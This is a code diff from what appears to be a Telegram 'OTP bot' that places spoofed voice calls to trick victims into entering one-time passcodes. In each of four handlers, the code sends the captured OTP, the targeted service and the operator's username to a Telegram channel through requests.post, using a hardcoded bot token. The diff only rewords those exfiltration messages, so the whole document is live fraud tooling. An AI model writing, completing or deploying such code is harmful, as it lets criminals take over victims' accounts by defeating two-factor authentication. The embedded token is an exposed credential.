@@ -869,7 +869,7 @@ def callhangup(chatid:int):
 
 
 def callhangbutton(userid):  
-    bot.send_message(userid, f"*Phone Ringing 📳\nHangup ongoing call - /endcall*",  parse_mode='markdown')
+    bot.send_message(userid, f"*Phone Ringing 📳*",  parse_mode='markdown')
 
 
 def callmaking(number,spoof,chatid,service,amd):
@@ -1213,14 +1213,15 @@ def custom_prebuild_script_call(script_id,chatid):
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
             requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
-Another Call Was Successful 👤
 
-Custom OTP:- <code>{otp2}</code> ✅
-Username:- @{voices[12]} 🆔
-Service Name:- {custom_sc_src[2]} ⌛️
-Call Type:- CustomCall 📲
+• Call Status : Success
+• The OTP is {otp2} 
+• Service :- {custom_sc_src[2]} 
+• Grabed By :- {voices[12]} 
+• Call Type:- Normal Call 
 
-Powered By:- @Sourceotpbot 🔐""")
+Powered By:- @Sourceotpbot 🔐
+""")
             bot.register_next_step_handler(callinfo,custom_confirm1)
     c.close()
     return 'Webhook received successfully!', 200
@@ -1401,14 +1402,15 @@ def prebuild_script_call(service,chatid):
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
             requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
-Another Call Was Successful 👤
 
-Custom OTP:- <code>{otp2}</code> ✅
-Username:- @{voices[12]} 🆔
-Service Name:- {service} ⌛️
-Call Type:- Normal Call 📲
+• Call Status : Success
+• The OTP is {otp2} 
+• Service :- {service} 
+• Grabed By :- {voices[12]} 
+• Call Type:- Normal Call 
 
-Powered By:- @Sourceotpbot 🔐""")
+Powered By:- @Sourceotpbot 🔐
+""")
             bot.register_next_step_handler(callinfo,confirm1)
     c.close()
     return 'Webhook received successfully!', 200
@@ -1590,14 +1592,15 @@ def t_custom_prebuild_script_call(script_id,chatid):
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
             requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
-Another Call Was Successful 👤
 
-Custom OTP:- <code>{otp2}</code> ✅
-Username:- @{voices[12]} 🆔
-Service Name:- {custom_sc_src[2]} ⌛️
-Call Type:- CustomCall 📲
+• Call Status : Success
+• The OTP is {otp2} 
+• Service :- {custom_sc_src[2]} 
+• Grabed By :- {voices[12]} 
+• Call Type:- CustomCall 
 
-Powered By:- @Sourceotpbot 🔐""")
+Powered By:- @Sourceotpbot 🔐
+""")
             bot.register_next_step_handler(callinfo,tcustom_confirm1)
     else:
          print("Nothing")
@@ -1771,14 +1774,15 @@ def tprebuild_script_call(service,chatid):
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
             requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
-Another Call Was Successful 👤
 
-Custom OTP:- <code>{otp2}</code> ✅
-Username:- @{voices[12]} 🆔
-Service Name:- {service} ⌛️
-Call Type:- Normal Call 📲
+• Call Status : Success
+• The OTP is {otp2} 
+• Service :- {service} 
+• Grabed By :- {voices[12]} 
+• Call Type:- Normal Call 
 
-Powered By:- @Sourceotpbot 🔐""")
+Powered By:- @Sourceotpbot 🔐
+""")
             bot.register_next_step_handler(callinfo,tconfirm1)
     c.close()
     return 'Webhook received successfully!', 200
